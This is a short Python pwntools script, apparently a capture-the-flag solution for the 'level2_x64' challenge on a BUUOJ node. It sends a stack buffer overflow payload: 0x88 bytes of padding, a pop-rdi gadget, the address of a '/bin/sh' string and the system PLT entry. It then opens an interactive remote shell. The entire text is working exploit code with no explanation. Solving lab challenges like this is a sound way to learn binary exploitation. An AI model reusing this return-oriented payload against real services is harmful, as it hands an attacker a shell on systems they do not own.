from pwn import *
#io = process("./level2_x64")
io = remote('node3.buuoj.cn',28783)
elf = ELF("./level2_x64")
io.recv()
sys_plt = elf.plt['system']
pop_rdi_ret = 0x0004006b3
bin_sh = 0x00600A90
payload = 0x88*'a' +p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)
io.sendline(payload)
io.interactive()